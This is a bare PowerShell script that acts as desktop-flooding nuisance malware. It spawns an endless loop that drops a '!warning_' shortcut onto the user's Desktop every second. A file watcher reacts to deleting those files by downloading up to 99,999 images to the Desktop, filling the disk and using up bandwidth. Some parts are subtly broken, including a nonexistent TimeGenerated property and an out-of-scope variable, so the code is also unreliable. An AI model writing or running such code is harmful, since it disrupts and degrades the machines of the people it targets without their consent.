# Define the PowerShell job for monitoring file deletion
$job = Start-Job -ScriptBlock {

    # Set the path to monitor
    $path = "$env:USERPROFILE\Desktop"

    # Initialize the file system watcher
    $watcher = New-Object System.IO.FileSystemWatcher
    $watcher.Path = $path
    $watcher.Filter = "*.*"
    $watcher.IncludeSubdirectories = $false
    $watcher.EnableRaisingEvents = $true

    # Define the event handler for file deleted events
    $deletedEventHandler = {
        $eventArgs = $args[1]
        Write-Host "File $($eventArgs.Name) deleted at $($eventArgs.TimeGenerated)"
        $folderPath = "$env:USERPROFILE\Desktop"
        $filter = "*!warning*"

        # Define the script block to execute when a file is deleted
        $action = {
            Write-Host "File $($eventArgs.Name) deleted."
            # Set the path where the images will be saved
            $path = "$env:USERPROFILE\Desktop"

            # Set the maximum number of images to download
            $maxImages = 99999

            # Loop through the number of images and download a random monkey image
            for ($i = 1; $i -le $maxImages; $i++) {
                # Generate a random filename
                $filename = "monkey$i.jpg"

                # Set the Unsplash API endpoint to retrieve random monkey images
                $url = "https://source.unsplash.com/featured/?warning"

                # Download the image and save it to the specified path with the generated filename
                Invoke-WebRequest -Uri $url -OutFile "$path\$filename"
            }
        }

        # Create a file system watcher
        $watcher = New-Object System.IO.FileSystemWatcher
        $watcher.Path = $folderPath
        $watcher.Filter = $filter
        $watcher.EnableRaisingEvents = $true

        # Register the event
        Register-ObjectEvent $watcher "Deleted" -Action $action

    }

    # Register the event handler with the file system watcher
    Register-ObjectEvent $watcher "Deleted" -Action $deletedEventHandler

    # Loop indefinitely to keep the job running
    while ($true) {
        Start-Sleep -Seconds 60
    }
}

# Open a new PowerShell window and run the while loop code in it
Start-Process powershell.exe "-NoExit -Command while(`$true`) { 
    `$extension = Get-Random -InputObject @('.txt', '.docx', '.pdf', '.jpg', '.mp3')
    `$filename = '!warning_' + (Get-Date -Format yyyyMMddHHmmss) + `$extension
    `$WshShell = New-Object -comObject WScript.Shell
    `$shortcut = `$WshShell.CreateShortcut('$env:USERPROFILE\Desktop\' + `$filename + '.lnk')
    `$shortcut.TargetPath = 'powershell.exe'
    `$shortcut.Save()
    Start-Sleep -Seconds 1
}"



# Prompt the user to stop the job when desired
Read-Host "Press Enter to stop the job."
Stop-Job $job
